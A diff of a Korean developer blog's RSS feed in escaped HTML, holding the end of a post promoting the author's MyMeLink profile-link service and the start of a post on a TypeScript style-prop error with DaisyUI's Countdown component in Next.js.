+    style=&quot;padding-bottom: 80%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAADWklEQVQ4y6WU7U9bVRjA+3+ZaFTCEuMHPqiLHwgSyaaLi9EZHC5+QBxsXbuV8U43YAwHgi0CK5RXeWk23nFDVkpLx+29t2/c3rasJTBefp5eyKIfnCbe5Jfnec597u+em3vOMUkhldU1H38885HJZPm/l0nTEvg2AvgDQbREgv39ffb29l6Rze6+Ync3F7MGu7vZv9W53uPjY0zpdBpFCaMndF7u74lcISRJyFIIWZZJJROkT9G0bZLJJKlUEl3XSSQ00qlcrYt7GgcHB5jWfT4KPvyIs4WFFH1awpaQ6JkXxEVjQmCpu0e51c5VWwt9A4NYLVbMZgttrW086HLyY1U1FVdvMTY+dfLJm34/XxcVcrn4E76/+AXB1TUiT9ZQlp4S8Qdpsrdhs9qoud2Ae8iFvaachltX6HnQRP8vXdSby6kTeCbHT4S6P0Cq8ByZos9If/MditlO9MznxPLPI/3QiN9Sglaah/rt+3gf2lCd+ajdeUjuC8T7LpO2v0Oq6S1inrsc5IThsERvfyV9rmuMjNYyPDtFs8tBw0A3rsfT3Buop66rgvruKtxzEzSO9lLr7qbbM0z/oznqh4apHXTjebp6MkMp7OX60NuYR/K4M3kWq+dn3uuzkt97jYrpHr6atVAwWcbHM1eomXeJ8fu86Wzh4piTsqkl3nD8JpigZXlN6MRf9ks6xTdTFNsylDanuTmxyZlOL+92eKma8GOvjFJ+KUZlWRT3TwqdX2q0X9DoM0fx3FYYOBelvyTCilMVwkNMIWmb6hsb1Fo3aW0K8uvgCtdrxqisHsXxcJERt4yjR8Lp2GJ+JsR4p8KIEHtcMsvDMjMdCtPtMt45VcxPCGMbMZaKfmf1/BpPSn1s2VxEP7ASKbCg3HCiv0ygawp6Mkx8O4yWUg22dZVYQoyJ3ECLcHhweLJTnm+EeL4eIijiVnCL4HqAoDeAJPLcolcU1UA1YthAPa3VXC2rhMNCeGgINXxiLUbjUTLZHXZ20uxkdngh8lQ6SSQSEc3h16KqqtFnCGVZobruLjX1rTTa79PQ3C5iO3WNrXR0OghsBo3tmHvodeTEpzNMML+wzOzcIo//wqPZBRYWV5CFLPf2fyIajRoxHo9zdHSE6d8PpGPjFPkv5K4/AfAwRD0hvW9zAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img06&quot;
+        title=&quot;img06&quot;
+        src=&quot;/static/fb632b1e21aebff3830b93dbea59ef92/e0885/img06.png&quot;
+        srcset=&quot;/static/fb632b1e21aebff3830b93dbea59ef92/5a46d/img06.png 300w,
+/static/fb632b1e21aebff3830b93dbea59ef92/0a47e/img06.png 600w,
+/static/fb632b1e21aebff3830b93dbea59ef92/e0885/img06.png 918w&quot;
+        sizes=&quot;(max-width: 918px) 100vw, 918px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/td&gt;
+&lt;td&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 873px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 82.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACuElEQVQ4y6VTyW4TQRCd/z8jRIAjEhASFDgg4BCQIF4SO4vjGc94G89MT/es3jCKskiPV+0cwi0IS09dU67uV/WqyvGHE0zCGFMioP2/PyecJYhihURpjCYhbm9vcXNz8zhcX29xb9/d3cGJkwR914PnDaC1hiHSNLW25im2McZ+W78gy6DyHLooYIiUtmLMYrGAo1SKOKUjqzBm2Xm9hCkXEL/OSpTzNWbK8MLWVnkJ0+1is/8e9d4esre7+L2/j+LwG6rlEk5GtqyokJcVwihGanILxUxUysxMYf1xQgLxa/qGQ5TtY+hmC0mjQbsN3ethLhkmLNllyQPfh9haS5nKli5kJjPIixwZyzJCTmj6FH0py9VlSbtAwpLn8zmciOx91+eDQ0ymIVKrlcYsijAgUdD34D+EH9xrbJBSFpUIuWEyavugsIo21XKDyUxRwxWqxS+4wRijN7uoXrzE+MlTRM92UOw8x+Gr1wi1yLRAGGsE4xlKxvfcbYWOdFAMYZBOJkrZDGJ+Hx1+x2eK/+XgA74efMSnd/to/DhCGIZoU8NOp4Nu9xTHxyf2rOtaHiRbOUfB7touV0sL0bV7cYmpynDhBfBGU2uf0SdjluiC8Qk8VqLzGv5oYvV1JCuXFy7dAS4uXfQ9Hz1q5Xoemq02Gs02fh41cdRoWZycdGwDJUZwcdm3d85JVLA5zoxNiThnwihsic4RpRm3h6vIrHpugNbJKTpnPfQHI7RYXjiLbXYuv896LqZRinMmI/I5op0/HPPyBINgaE8/GFmd8qJEVS94VijKGvV8aYkUp6Co5nZ+TV6gZIysblVVLJmvSrcE0qkw0bbbAYdXZlHdN0lmU2xj9HYN7/36wX929ezOGhlg7qQ9c7sRsWSi1KNgp4LxtsubzQar1ZJY/YX1ev1PkDtXV1f4Ayw9kUlUfFsyAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img07&quot;
+        title=&quot;img07&quot;
+        src=&quot;/static/9b7525f513bc4741769c056216d74df7/35751/img07.png&quot;
+        srcset=&quot;/static/9b7525f513bc4741769c056216d74df7/5a46d/img07.png 300w,
+/static/9b7525f513bc4741769c056216d74df7/0a47e/img07.png 600w,
+/static/9b7525f513bc4741769c056216d74df7/35751/img07.png 873w&quot;
+        sizes=&quot;(max-width: 873px) 100vw, 873px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/td&gt;
+&lt;td&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 903px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 107.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAVCAYAAABG1c6oAAAACXBIWXMAAAsTAAALEwEAmpwYAAAE80lEQVQ4y62TWWxUVRyHa0x48cXE4IPxxcTEmGrwSUVpJDEYiQkkEJUEMSAWMMGGLYiaMizSloIIFBDa0pS2dMGKXafb2H26UmZpO0uZ6exzZ+ls7UynLZ35PJ0STIiP3uTLycm598vv9z+5adpxPVMmC//Xk+b1+ZEkD/Pz80+JxZ4l9p9Eo4In68p7iUSCNEmSGH3wEIPRiNvtwulw4HI5n8GFR3I/RUqtEj6vZxWfJ7VfXFxcEXqwODxYnT6xerE5JQwmKyqdBY3emsLwyEKjYohaeT/3mvto7x2jq3+E89cquFxYQ15BOe1dg5AUCV1uIXOHsEorhLG5/EI2zaDWypDWwuiknWG1gWtlLVwqaeJicSMlf3RSVFHPF/tPs/tQHtszZdwo/XN1hitCuyeE3uTAZPdhd8+IVBYhm6Z7aJwxvZ1RjZGi6g5+u13PJUFFXS+lNc3sOZxH5tFcdmWd4/bdhn+FFldQSCPYpEiqumrSzIDGwvC4leEJGyMqPQWlTfwq0l0obOB2jYKi8jq27c3m66wctu7+mRsltatCyePF7JCYFnM0p2YpYbQ4UE/Z0KSwM2Wx0zagpr7rAXWdo3SNTqB8OM71u40U1sgpqGike1gtRrhMmk/cYFitZlajYU6lYsZgwDc2xlxrC3OKDuba2/GI80hVJbHiImJFtwj9dR/vytlpGbO5OczJsvHJm1lYSei3WEgODgqGQDlATHwcbGklWVTMUukdknfu4G2WM3v0KPH9+4l/m0nkpAxn3nmC697Bn5FBMP0t3GfOEk8JrVYSIyNEenpY6OsjqtUS7FAIWSmBkhKWKyvxipRz2dkEs7IIHzzIbF4erstXCG3ciG3zZgIbNiBdvPhEmEqohGGRcEBJTNQOtchBVEuWlUJpiagjJ3bsCMsHMkns20tUdhKXkEbWvU0440Mi6W8inT2zKvS5JfwaPTOCgFqH12hG0ujwK/rxdw4IBnGL/91R3YCjuAZHUTWOulacPQOi9lWcl27gzLmMs6OHRZJC6LEQsN8j5FjhLj5nN57pBoIGGQFjDpFHZzHrO9B2ncTUc0CwH01vLtOqWmb+3omvcy/+jh24tZUsPF6p7NaQcJ4B6Ry4s4k6SglNyED1LkntJpj4CNNgLr7GdOh6CTpfxNX8Pub6fTy+nsZ84XMsXE3D37KHeDIl1LLsukBoKoe45SxzriqCujyW1JvwD2wF3RZMI5fwtqxntvV1om2v4Wz7BLP8MPGSNbhuvkz0lhAqvieeeJJwWSRcdv1C0pXNnPMOwclTJNTvsSikTG7k0VAuUlM6ic61JDtfwi5fj6lhH/Hf0wgXPk+0IA1v6zerCX0eK2FrPbO2OoGYi72fGVMbMV0+Uf0V4sbLTI8rMDYcwCPfjqd5G7qmIzge1LOkOMi84ggLbd8R0NxnYVkIHV6Jfr8BZcBIb8CAxjtNj2uCEk8f5R4lZV4lg04d+eZ6TpirOG6u5LqllfsmJbtUBezT3GSn6gqVU92wJG7Z5LMhnx+lbeEhzQujKMMTVLg7OBEq43SwClm4kgpbO1umTpFhPs4H5mN8ZcrnuOoGL3R/xqu9X7Km61MOPbwqhCKhyWujY15Ng2+AxsgwQ2E91VIXskAVp6zl5IRrqbZ3ssOcz6bJn/hY9yOZlgKy1cW80reDN9p3sbbnc37Q3EoJ/wFT52m6jgp26wAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img08&quot;
+        title=&quot;img08&quot;
+        src=&quot;/static/78bcaea09a534d50d3557d1072c5070a/c4b7c/img08.png&quot;
+        srcset=&quot;/static/78bcaea09a534d50d3557d1072c5070a/5a46d/img08.png 300w,
+/static/78bcaea09a534d50d3557d1072c5070a/0a47e/img08.png 600w,
+/static/78bcaea09a534d50d3557d1072c5070a/c4b7c/img08.png 903w&quot;
+        sizes=&quot;(max-width: 903px) 100vw, 903px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;br&gt;
+&lt;p&gt;아직은 투박하고 기능도 많이 부족하다.&lt;br&gt;
+뭐 0.9.5 버전이라 완성도는 많이 떨어진다.&lt;/p&gt;
+&lt;p&gt;깃허브에 이슈등록된거만 엄청 많다. =.=;;&lt;br&gt;
+그런데 하나씩 하다보면 되겠지…&lt;/p&gt;
+&lt;p&gt;이렇게 꾸미고 나서 사용자가 보는 페이지는 다음과 같다.&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1170px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 216.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,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&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;img09&quot;
+        title=&quot;img09&quot;
+        src=&quot;/static/ffbd8f27eb3f2f6c7107f5849c964369/105d8/img09.png&quot;
+        srcset=&quot;/static/ffbd8f27eb3f2f6c7107f5849c964369/5a46d/img09.png 300w,
+/static/ffbd8f27eb3f2f6c7107f5849c964369/0a47e/img09.png 600w,
+/static/ffbd8f27eb3f2f6c7107f5849c964369/105d8/img09.png 1170w&quot;
+        sizes=&quot;(max-width: 1170px) 100vw, 1170px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;아래는 직접 볼 수 있는 링크다.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://myme.link/elfinlas&quot;&gt;https://myme.link/elfinlas&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;일단 어떻게 개발을 하고 어떤 이슈가 있었는지는 다시 포스팅을 정리하며 올릴 예정이다.&lt;br&gt;
+사실 지금은 이걸 유료화 해보고 싶어서 좀 기능을 이것저것 개발해서 사용자를 모아보고 싶다.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://myme.link&quot;&gt;MyMeLink&lt;/a&gt;&lt;/strong&gt;로 인해 내가 그린 첫 퍼즐(?)은 하나 완성되었다.&lt;br&gt;
+물론 아직 반쪽짜리긴 하지만…&lt;/p&gt;
+&lt;p&gt;사실 어제부터 또 하나의 프로젝트를 시작했다.&lt;br&gt;
+전에 만들던 커뮤니티…&lt;/p&gt;
+&lt;p&gt;이거는 이번 &lt;strong&gt;&lt;a href=&quot;https://myme.link&quot;&gt;MyMeLink&lt;/a&gt;&lt;/strong&gt;를 만든 기술등을 녹여서 다시 제대로 만들어볼 예정이다.&lt;br&gt;
+혼자서 하기엔 힘들 수 있지만…&lt;br&gt;
+어쩌랴 ㅎㅎ&lt;br&gt;
+내 주변엔 이런거 할 사람도 없고 뜻 맞는 사람도 찾기 어렵다 ㅎㅎ&lt;/p&gt;
+&lt;p&gt;주식시장이랑 부동산쪽에 하도 있었더니 주변에 개발자는 없어지고…&lt;br&gt;
+일단 정보방이랑 시장 돌면서 &lt;strong&gt;인간에 대한 불신&lt;/strong&gt; 도 많이 생겼다.&lt;/p&gt;
+&lt;p&gt;요새 다시 스타트업이나 회사로 들어가서 개발자로 일해보고 싶다는 생각도 문뜩 들었다.&lt;br&gt;
+뭐랄까…&lt;br&gt;
+그냥 떡볶이 팔던 놈은 떡볶이 팔아야지.&lt;br&gt;
+떡볶이 팔던 놈이 냉면 팔고, 돈까스 팔고 했더니 잡탕이 되어가는거 같다 ㅎㅎ&lt;/p&gt;
+&lt;p&gt;뭐니해도 개발자는 적당한 스킬만 있으면 어디서 굻어죽지는 않으니까?&lt;/p&gt;
+&lt;p&gt;무튼…&lt;br&gt;
+이 글을 보시는 분은 한번 서비스 가입해서 써봐주시고 피드백 주실게 있다면 반영해보겠다.&lt;/p&gt;
+&lt;p&gt;다음 포스팅은 이거 개발하며 있었던 이슈 들을 하나씩 풀어보겠다.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://myme.link/mml&quot;&gt;MyMeLink 홍보 페이지&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;
+많은 관심 부탁드립니다 ^^&lt;/p&gt;</content:encoded></item><item><title><![CDATA[NextJs에서 DasiyUI 일부 컴포넌트 사용시 style 문제 (Typescript) (DetailedHTMLProps, Properties, HTMLAttributes)]]></title><description><![CDATA[오늘도 평화로운 날이 있을 수 없는… 기존 프로젝트를 진행하면서 신규를 또 진행하는 어이없는 일정을 진행하며… 이번 문제는 DasiyUI에서 Countdown…]]></description><link>https://elfinlas.github.io/next-js/221027_detailedhtmlprops-problem/</link><guid isPermaLink="false">https://elfinlas.github.io/next-js/221027_detailedhtmlprops-problem/</guid><pubDate>Thu, 27 Oct 2022 19:10:59 GMT</pubDate><content:encoded>&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 60.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAAC40lEQVQozy2R2XbaWBBF9TPpTrcnPCUdT/EUY5ABDViykQGJQTKIwWAwk8HGiRNPy3nIQ39Bf+fuWu5+OEuqu07tOnWvMhPzWDwqMaeWmY2XmYmVOdLPUbWAlbicHxb57cAjIbVhnDMj9btokffi+1P1iSQqLGkhi3qNVaOGMpvwmUtWmP9fi6K4WUMV7YhxS6uyEPcxzCqaGcpQn/dqwOyReFMhK3qdZbPJlt0mneuiRPSQiFEnojfetGo0cJw28eMm++kmKfuCTa2GbUmTpPjjqMqcgCJanSWjyXJavM4VGXdAwhuibNhN1k9afJIJK1b7zZB2OhyeXKJlOljyH7VaqHaLeRk4L5AF44IF8X2wO5j5AWlvxBf3Gq08QTnINIhm2+yedVnLXLF0ckXyrIcu+u8rdaYrK3WYP75k2e4Ssbp8OO0Ryw2ximO00g1u+JV2+x4llqkJ8JI1af54NmDVGbCTHZKRqXp+RNodoUnjhtNn6bTPSmYgviG7kuigMEH1pwSNe9qdBwqdR5SkIwnlMj/nBqxJ41+56zfFvDF2aYJenGCINt0xn0Rr3oTt4g275Smx8694ze+EAnK7z+T7LyiWAK1ch5QrK8il7hfG7AsgKmto/i3W+RS7cscXSbIlkJ3gjj0BHYb3nF78wO084Vy94AxeKYx/okRNn/RpyEmuheF20QoDjPIYI7jBrAiwOuW4MkWv3qGG34jVvhGt35NoPaALzOy9cDJ6JTv5iXf7KgmzPjHL5yAd4HgNrtp98pU+aX+AHlzjt275++WFoPcd/XxEIhDVpyTlAbTeI+bgCfv6mbObZwp3Tyhq0mJPtdlWT0kaDkGhRLd5gZGvo7kX1Ft9/vn1wOOPe5J+j1R1iB7KQ9VHpBqisIfZ6GO1h2hhB2VpI8rCWpTI+iGRDZWNvRR5J4dp5TgyspxlSwTlgKwXyBYFPhsu28dFNk2PdT3PesrhY9xicTfB76vb/Au2vfaMwDExYgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;thumbnail&quot;
+        title=&quot;thumbnail&quot;
+        src=&quot;/static/406f644ca1539f0ec9ac57a824d7ae0b/d9199/DSC08660.png&quot;
+        srcset=&quot;/static/406f644ca1539f0ec9ac57a824d7ae0b/5a46d/DSC08660.png 300w,
+/static/406f644ca1539f0ec9ac57a824d7ae0b/0a47e/DSC08660.png 600w,
+/static/406f644ca1539f0ec9ac57a824d7ae0b/d9199/DSC08660.png 960w&quot;
+        sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&quot;오늘도-평화로운-날이-있을-수-없는&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%98%A4%EB%8A%98%EB%8F%84-%ED%8F%89%ED%99%94%EB%A1%9C%EC%9A%B4-%EB%82%A0%EC%9D%B4-%EC%9E%88%EC%9D%84-%EC%88%98-%EC%97%86%EB%8A%94&quot; aria-label=&quot;오늘도 평화로운 날이 있을 수 없는 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;오늘도 평화로운 날이 있을 수 없는…&lt;/h2&gt;
+&lt;p&gt;기존 프로젝트를 진행하면서 신규를 또 진행하는 어이없는 일정을 진행하며…&lt;br&gt;
+이번 문제는 &lt;a href=&quot;https://daisyui.com&quot;&gt;DasiyUI&lt;/a&gt;에서 Countdown 컴포넌트를 적용하면서 발생한 문제로..&lt;/p&gt;
+&lt;p&gt;바로 아래의 문제의 코드를 보자.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;typescript&quot;&gt;&lt;pre class=&quot;language-typescript&quot;&gt;&lt;code class=&quot;language-typescript&quot;&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;div className&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;flex flex-col&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+  &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;span className&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;font-mono countdown text-3xl&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+    &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;span style&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token string-property property&quot;&gt;&apos;--value&apos;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; seconds &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;span&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+  &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;span&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+  sec
+&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;div&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;위 코드에서 span 태그 안에 style에 &lt;strong&gt;—value&lt;/strong&gt;라는 css 키 요소가 문제였다.&lt;br&gt;
+에러는 다음과 같이 발생했다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;&apos;{ &quot;--value&quot;: number; }&apos; 형식은 &apos;Properties&amp;lt;string | number, string &amp;amp; {}&gt;&apos; 형식에 할당할 수 없습니다.
+  개체 리터럴은 알려진 속성만 지정할 수 있으며 &apos;Properties&amp;lt;string | number, string &amp;amp; {}&gt;&apos; 형식에 &apos;&quot;--value&quot;&apos;이(가) 없습니다.ts(2322)
+index.d.ts(1863, 9): 필요한 형식은 여기에서 &apos;DetailedHTMLProps&amp;lt;HTMLAttributes&amp;lt;HTMLSpanElement&gt;, HTMLSpanElement&gt;&apos; 형식에 선언된 &apos;style&apos; 속성에서 가져옵니다.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;에디터 내에서는 에러가 발생하지만 개발용으로 구동 시 잘 돌아간다.&lt;br&gt;
+하지만 빌드를 하여 프로덕션으로 가면 이야기가 달라진다.&lt;br&gt;
+저 에러를 해결하지 않는 이상 빌드는 진행되지 않는다.&lt;/p&gt;
